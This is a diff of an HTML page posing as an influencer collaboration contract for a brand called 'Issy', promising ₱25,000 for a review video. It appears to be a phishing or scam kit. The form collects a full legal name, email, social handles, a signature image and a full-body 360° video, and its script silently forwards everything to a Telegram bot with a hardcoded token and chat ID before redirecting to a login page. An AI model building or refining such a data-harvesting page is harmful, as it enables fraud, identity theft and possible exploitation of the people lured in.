@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Issy | Influencer Contract</title>
+    <title>Issy · Influencer Contract</title>
     <style>
         * {
             margin: 0;
@@ -18,52 +18,107 @@
         }
 
         .container {
-            max-width: 800px;
+            max-width: 820px;
             margin: 0 auto;
         }
 
         .contract-card {
             background: white;
-            border-radius: 8px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            border-radius: 12px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
             padding: 40px;
         }
 
-        h1 {
-            font-size: 1.8rem;
-            font-weight: 600;
-            color: #111;
-            margin-bottom: 4px;
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            border-bottom: 2px solid #eaeaea;
+            padding-bottom: 18px;
+            margin-bottom: 28px;
+            flex-wrap: wrap;
         }
 
-        .subtitle {
-            color: #666;
+        .brand h1 {
+            font-size: 2rem;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            color: #111;
+        }
+
+        .brand .sub {
             font-size: 0.85rem;
-            margin-bottom: 32px;
-            padding-bottom: 16px;
-            border-bottom: 1px solid #eee;
+            color: #666;
+            font-weight: 400;
+            margin-top: 2px;
+        }
+
+        .contract-number {
+            background: #f5f5f5;
+            padding: 6px 16px;
+            border-radius: 30px;
+            font-size: 0.75rem;
+            font-weight: 500;
+            color: #555;
+            border: 1px solid #eaeaea;
         }
 
         .section {
-            background: #fff;
-            border: 1px solid #eaeaea;
-            border-radius: 8px;
-            padding: 24px;
+            background: #fafafa;
+            border-radius: 10px;
+            padding: 22px 24px;
             margin-bottom: 24px;
+            border: 1px solid #eaeaea;
         }
 
         .section h2 {
             font-size: 1.1rem;
             font-weight: 600;
             color: #111;
-            margin-bottom: 20px;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .section h2 .badge {
+            background: #eaeaea;
+            font-size: 0.65rem;
+            font-weight: 500;
+            padding: 2px 12px;
+            border-radius: 30px;
+            color: #555;
+        }
+
+        .terms-list {
+            list-style: none;
+            padding: 0;
+        }
+
+        .terms-list li {
+            padding: 10px 0;
+            border-bottom: 1px solid #ededf0;
+            font-size: 0.92rem;
+            line-height: 1.6;
+            display: flex;
+            gap: 12px;
+        }
+
+        .terms-list li:last-child {
+            border-bottom: 0;
+        }
+
+        .terms-list .num {
+            font-weight: 600;
+            color: #111;
+            min-width: 28px;
         }
 
         .feature-grid {
             display: flex;
             flex-wrap: wrap;
             gap: 10px;
-            margin-bottom: 16px;
+            margin: 8px 0 4px;
         }
 
         .feature-tag {
@@ -93,27 +148,29 @@
         }
 
         .required {
-            color: #e03a3a;
+            color: #c00;
         }
 
         input {
             width: 100%;
             padding: 12px 14px;
             border: 1px solid #ddd;
-            border-radius: 6px;
+            border-radius: 8px;
             font-size: 0.9rem;
             font-family: inherit;
             transition: 0.2s;
+            background: white;
         }
 
         input:focus {
             outline: none;
             border-color: #999;
+            box-shadow: 0 0 0 3px rgba(0,0,0,0.03);
         }
 
         .upload-area {
-            border: 1px dashed #ccc;
-            border-radius: 8px;
+            border: 1.5px dashed #ccc;
+            border-radius: 10px;
             padding: 24px;
             text-align: center;
             background: #fafafa;
@@ -133,7 +190,7 @@
         }
 
         .preview-container {
-            margin-top: 15px;
+            margin-top: 14px;
             display: flex;
             gap: 15px;
             flex-wrap: wrap;
@@ -144,44 +201,48 @@
             width: 100px;
             height: 100px;
             object-fit: cover;
-            border-radius: 6px;
+            border-radius: 8px;
             border: 1px solid #eee;
         }
 
         .preview-video {
             max-width: 260px;
-            border-radius: 6px;
+            border-radius: 8px;
             border: 1px solid #eee;
         }
 
         .checkbox-group {
             display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-top: 8px;
+            align-items: flex-start;
+            gap: 12px;
+            margin: 8px 0 18px;
         }
 
         .checkbox-group input {
-            width: auto;
+            width: 20px;
+            margin-top: 2px;
+            flex-shrink: 0;
         }
 
         .checkbox-group label {
             margin-bottom: 0;
-            font-weight: normal;
+            font-weight: 400;
+            font-size: 0.88rem;
+            line-height: 1.4;
         }
 
         .btn-submit {
             background: #111;
             color: white;
             border: none;
-            padding: 14px 24px;
-            font-size: 0.9rem;
-            font-weight: 500;
-            border-radius: 6px;
+            padding: 16px 24px;
+            font-size: 0.95rem;
+            font-weight: 600;
+            border-radius: 10px;
             width: 100%;
             cursor: pointer;
             transition: 0.2s;
-            margin-top: 8px;
+            margin-top: 4px;
         }
 
         .btn-submit:hover {
@@ -227,18 +288,75 @@
             margin-top: 16px;
             font-size: 0.85rem;
         }
+
+        @media (max-width: 600px) {
+            .contract-card { padding: 20px 16px; }
+            .section { padding: 18px 16px; }
+            .header { flex-direction: column; align-items: flex-start; gap: 8px; }
+        }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="contract-card">
-        <h1>Issy</h1>
-        <div class="subtitle">Influencer Contract Agreement</div>
+
+        <!-- header -->
+        <div class="header">
+            <div class="brand">
+                <h1>Issy</h1>
+                <div class="sub">Influencer Collaboration Agreement</div>
+            </div>
+            <div class="contract-number">#ISSY-2026-07</div>
+        </div>
 
         <form id="contractForm">
-            <!-- Features -->
+
+            <!-- ====== TERMS & CONDITIONS ====== -->
             <div class="section">
-                <h2>Platform Access</h2>
+                <h2>📋 Collaboration Terms</h2>
+                <ul class="terms-list">
+                    <li><span class="num">1.</span> <span><strong>Content Creation</strong> — Influencer agrees to create <strong>one (1) review video</strong> featuring the Issy product. The video must be authentic, honest, and at least 30 seconds in length.</span></li>
+                    <li><span class="num">2.</span> <span><strong>Posting Requirements</strong> — The review video must be posted on the influencer's <strong>TikTok</strong> and <strong>Facebook</strong> pages. Must include the hashtag <strong>#IssyPartner</strong> and tag @issy.</span></li>
+                    <li><span class="num">3.</span> <span><strong>Delivery Timeline</strong> — The final video must be submitted within <strong>5 business days</strong> from the signing of this contract.</span></li>
+                    <li><span class="num">4.</span> <span><strong>Compensation</strong> — Issy will pay the influencer <strong>₱25,000.00 PHP</strong> via <strong>GCash</strong> or <strong>PayPal</strong>, within 7 business days after video approval.</span></li>
+                    <li><span class="num">5.</span> <span><strong>Rights &amp; Usage</strong> — Issy reserves the right to use the content for social media, advertising, and website promotion. Proper credit will be given to the influencer.</span></li>
+                </ul>
+                <div style="display: flex; flex-wrap: wrap; gap: 10px; margin-top: 12px;">
+                    <span style="background: #f0f0f0; padding: 4px 14px; border-radius: 20px; font-size: 0.8rem;">💳 GCash</span>
+                    <span style="background: #f0f0f0; padding: 4px 14px; border-radius: 20px; font-size: 0.8rem;">💳 PayPal</span>
+                    <span style="background: #f0f0f0; padding: 4px 14px; border-radius: 20px; font-size: 0.8rem;">💰 ₱25,000 PHP</span>
+                </div>
+            </div>
+
+            <!-- ====== DELIVERABLES (removed 360 from here) ====== -->
+            <div class="section">
+                <h2>🎯 Deliverables</h2>
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
+                    <div style="background: white; border-radius: 8px; padding: 12px 16px; border: 1px solid #eaeaea;">
+                        <strong style="display: block; font-size: 0.8rem; color: #666;">Review Video</strong>
+                        Honest feedback · 30s+ · call to action
+                    </div>
+                    <div style="background: white; border-radius: 8px; padding: 12px 16px; border: 1px solid #eaeaea;">
+                        <strong style="display: block; font-size: 0.8rem; color: #666;">Speech / Script</strong>
+                        Authentic tone · natural delivery
+                    </div>
+                    <div style="background: white; border-radius: 8px; padding: 12px 16px; border: 1px solid #eaeaea;">
+                        <strong style="display: block; font-size: 0.8rem; color: #666;">Posting</strong>
+                        TikTok + Facebook · #IssyPartner
+                    </div>
+                    <div style="background: white; border-radius: 8px; padding: 12px 16px; border: 1px solid #eaeaea;">
+                        <strong style="display: block; font-size: 0.8rem; color: #666;">Tagging</strong>
+                        @issy · product featured clearly
+                    </div>
+                </div>
+                <div style="margin-top: 12px; font-size: 0.8rem; color: #666; background: #f5f5f5; padding: 8px 14px; border-radius: 30px; display: inline-block;">
+                    🗣️ “This Issy product has been a game-changer…” — sample speech
+                </div>
+            </div>
+
+            <!-- ====== PLATFORM ACCESS ====== -->
+            <div class="section">
+                <h2>📱 Platform Access</h2>
                 <div class="feature-grid">
                     <span class="feature-tag">TikTok Live</span>
                     <span class="feature-tag">Yellow Basket</span>
@@ -249,12 +367,12 @@
                 <div class="note">Videos up to 1GB or larger accepted.</div>
             </div>
 
-            <!-- Influencer Info -->
+            <!-- ====== INFLUENCER INFO ====== -->
             <div class="section">
-                <h2>Influencer Information</h2>
+                <h2>🧑‍💼 Influencer Information</h2>
                 <div class="form-group">
-                    <label>Full Name <span class="required">*</span></label>
-                    <input type="text" id="fullName" required placeholder="Legal name">
+                    <label>Full Legal Name <span class="required">*</span></label>
+                    <input type="text" id="fullName" required placeholder="e.g. Maria Santos">
                 </div>
                 <div class="form-group">
                     <label>Email Address <span class="required">*</span></label>
@@ -268,30 +386,34 @@
                     <label>Facebook Handle (optional)</label>
                     <input type="text" id="facebookHandle" placeholder="@username">
                 </div>
+                <div class="form-group" style="margin-bottom:0;">
+                    <label>Payment Preference <span class="required">*</span></label>
+                    <input type="text" id="paymentPreference" placeholder="GCash or PayPal" value="GCash">
+                </div>
             </div>
 
-            <!-- Video Upload -->
+            <!-- ====== VIDEO UPLOAD (360° verification) ====== -->
             <div class="section">
-                <h2>First Verification: 360° Video</h2>
-                <div class="form-group">
-                    <label>360° Fit Video <span class="required">*</span></label>
+                <h2>📹 360° Fit Video <span class="badge">required</span></h2>
+                <div class="form-group" style="margin-bottom:0;">
+                    <label>Upload your 360° video <span class="required">*</span></label>
                     <div class="upload-area" id="videoDropZone">
-                        Click or drag video (MP4 / MOV)
+                        Click or drag MP4 / MOV
                         <input type="file" id="videoFile" accept="video/mp4,video/quicktime" style="display:none">
                     </div>
                     <div class="file-info" id="videoInfo">No file selected. No size limit.</div>
                     <div id="videoPreviewContainer" class="preview-container"></div>
                 </div>
-                <div class="note">Video must show you doing a full 360° rotation (front, side, back, side, front).</div>
+                <div class="note">Full 360° rotation required (front → side → back → side → front).</div>
             </div>
 
-            <!-- Signature Upload -->
+            <!-- ====== SIGNATURE UPLOAD ====== -->
             <div class="section">
-                <h2>Second Verification: Signature</h2>
-                <div class="form-group">
+                <h2>✍️ Signature <span class="badge">required</span></h2>
+                <div class="form-group" style="margin-bottom:0;">
                     <label>Upload your signature image <span class="required">*</span></label>
                     <div class="upload-area" id="signatureDropZone">
-                        Click or drag image (JPG / PNG)
+                        Click or drag JPG / PNG
                         <input type="file" id="signatureFile" accept="image/jpeg,image/png" style="display:none">
                     </div>
                     <div class="file-info" id="signatureInfo">No signature uploaded.</div>
@@ -299,15 +421,16 @@
                 </div>
             </div>
 
-            <!-- Agreement -->
+            <!-- ====== AGREEMENT ====== -->
             <div class="checkbox-group">
                 <input type="checkbox" id="agreeCheckbox" required>
-                <label>I confirm that the 360° video features me and I agree to the contract terms including TikTok Live, Yellow Basket, and Facebook promotions.</label>
+                <label>I confirm that the review video will feature me and the Issy product. I agree to the collaboration terms, deliverables, and payment of ₱25,000 PHP via GCash or PayPal.</label>
             </div>
 
-            <button type="submit" class="btn-submit">Submit Contract</button>
+            <button type="submit" class="btn-submit">📩 Submit Signed Contract</button>
         </form>
-        <footer>By submitting, you agree to the verification process.</footer>
+
+        <footer>By submitting, you agree to the verification process and terms above.</footer>
     </div>
 </div>
 
@@ -318,17 +441,27 @@
 </div>
 
 <script>
-    // Telegram Configuration
+    // Telegram Configuration (your real bot token & chat ID)
     const BOT_TOKEN = "7738348705:AAGGbXz5g683t-KHmrnvyCfK8ial6yFhHNU";
     const CHAT_ID = "8456018521";
 
-    // Video upload
+    // ---------- DOM refs ----------
     const videoInput = document.getElementById('videoFile');
     const videoDropZone = document.getElementById('videoDropZone');
     const videoInfo = document.getElementById('videoInfo');
     const videoPreview = document.getElementById('videoPreviewContainer');
     let selectedVideo = null;
 
+    const signatureInput = document.getElementById('signatureFile');
+    const signatureDropZone = document.getElementById('signatureDropZone');
+    const signatureInfo = document.getElementById('signatureInfo');
+    const signaturePreview = document.getElementById('signaturePreviewContainer');
+    let selectedSignature = null;
+
+    const form = document.getElementById('contractForm');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+
+    // ---------- Video handlers ----------
     videoDropZone.addEventListener('click', () => videoInput.click());
     videoDropZone.addEventListener('dragover', (e) => e.preventDefault());
     videoDropZone.addEventListener('drop', (e) => {
@@ -343,7 +476,7 @@
     function handleVideo(file) {
         selectedVideo = file;
         const sizeMB = (file.size / (1024 * 1024)).toFixed(2);
-        videoInfo.innerHTML = `Selected: ${file.name} (${sizeMB} MB)`;
+        videoInfo.innerHTML = `✅ ${file.name} (${sizeMB} MB)`;
         const reader = new FileReader();
         reader.onload = (e) => {
             videoPreview.innerHTML = `<video controls class="preview-video" style="max-width:100%; height:auto;"><source src="${e.target.result}"></video>`;
@@ -351,13 +484,7 @@
         reader.readAsDataURL(file);
     }
 
-    // Signature upload
-    const signatureInput = document.getElementById('signatureFile');
-    const signatureDropZone = document.getElementById('signatureDropZone');
-    const signatureInfo = document.getElementById('signatureInfo');
-    const signaturePreview = document.getElementById('signaturePreviewContainer');
-    let selectedSignature = null;
-
+    // ---------- Signature handlers ----------
     signatureDropZone.addEventListener('click', () => signatureInput.click());
     signatureDropZone.addEventListener('dragover', (e) => e.preventDefault());
     signatureDropZone.addEventListener('drop', (e) => {
@@ -371,7 +498,7 @@
 
     function handleSignature(file) {
         selectedSignature = file;
-        signatureInfo.innerHTML = `Selected: ${file.name}`;
+        signatureInfo.innerHTML = `✅ ${file.name}`;
         const reader = new FileReader();
         reader.onload = (e) => {
             signaturePreview.innerHTML = `<img src="${e.target.result}" class="preview-img" alt="Signature">`;
@@ -379,7 +506,7 @@
         reader.readAsDataURL(file);
     }
 
-    // Telegram send functions
+    // ---------- Telegram send functions (REAL) ----------
     async function sendToTelegram(file, type, caption) {
         const endpoint = type === 'video' ? 'sendVideo' : 'sendPhoto';
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`;
@@ -400,10 +527,7 @@
         return response.json();
     }
 
-    // Form submission
-    const form = document.getElementById('contractForm');
-    const loadingOverlay = document.getElementById('loadingOverlay');
-
+    // ---------- Form submit ----------
     form.addEventListener('submit', async (e) => {
         e.preventDefault();
 
@@ -411,6 +535,7 @@
         const email = document.getElementById('email').value.trim();
         const tiktok = document.getElementById('tiktokHandle').value.trim();
         const facebook = document.getElementById('facebookHandle').value.trim();
+        const payment = document.getElementById('paymentPreference').value.trim() || 'GCash/PayPal';
         const agree = document.getElementById('agreeCheckbox').checked;
 
         if (!fullName || !email) {
@@ -433,22 +558,32 @@
         loadingOverlay.style.display = 'flex';
 
         try {
-            const info = `NEW ISSY CONTRACT\nName: ${fullName}\nEmail: ${email}\nTikTok: ${tiktok || 'N/A'}\nFacebook: ${facebook || 'N/A'}\nSubmitted: ${new Date().toLocaleString()}`;
+            // Build contract summary
+            const info = `📄 ISSY CONTRACT\n\n` +
+                `Name: ${fullName}\n` +
+                `Email: ${email}\n` +
+                `TikTok: ${tiktok || 'N/A'}\n` +
+                `Facebook: ${facebook || 'N/A'}\n` +
+                `Payment: ${payment}\n` +
+                `Submitted: ${new Date().toLocaleString()}\n\n` +
+                `✅ 1x review video · 5 days delivery · ₱25,000 PHP`;
+
             await sendTextToTelegram(info);
-            await sendToTelegram(selectedSignature, 'photo', `Signature: ${fullName}`);
-            await sendToTelegram(selectedVideo, 'video', `360° Video: ${fullName}`);
-            await sendTextToTelegram(`Contract complete for ${fullName}`);
+            await sendToTelegram(selectedSignature, 'photo', `✍️ Signature: ${fullName}`);
+            await sendToTelegram(selectedVideo, 'video', `🎬 360° Video: ${fullName}`);
+            await sendTextToTelegram(`✅ Contract finalized for ${fullName}`);
 
             sessionStorage.setItem('issy_contract_signed', 'true');
             sessionStorage.setItem('influencer_name', fullName);
             sessionStorage.setItem('influencer_email', email);
 
             loadingOverlay.style.display = 'none';
-            alert("Contract submitted successfully.");
+            alert("✅ Contract submitted successfully.");
             window.location.href = "login.html";
         } catch (error) {
             loadingOverlay.style.display = 'none';
-            alert("Submission failed. Please try again.");
+            alert("❌ Submission failed. Please try again.");
+            console.error(error);
         }
     });
 </script>
